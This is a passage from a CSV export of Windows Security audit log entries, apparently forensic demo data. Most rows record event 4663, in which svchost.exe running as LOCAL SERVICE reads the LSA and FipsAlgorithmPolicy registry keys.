AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
23,452833,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
24,452834,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
25,452835,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
26,452836,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
27,452837,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
28,452838,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
29,452839,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
30,452840,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
31,452841,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
32,452842,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
33,452843,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
34,452844,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
35,452845,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x1AC""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
36,452846,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
37,452847,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x1AC""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
38,452848,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x420""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
39,452849,2019-03-19 23:35:15.3154053,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x420""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
40,452850,2019-03-19 23:35:15.3154053,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x1AC""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
41,452851,2019-03-19 23:35:15.3154053,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x1AC""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
42,452852,2019-03-19 23:35:15.3154053,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x420""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
43,452853,2019-03-19 23:35:15.3154053,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
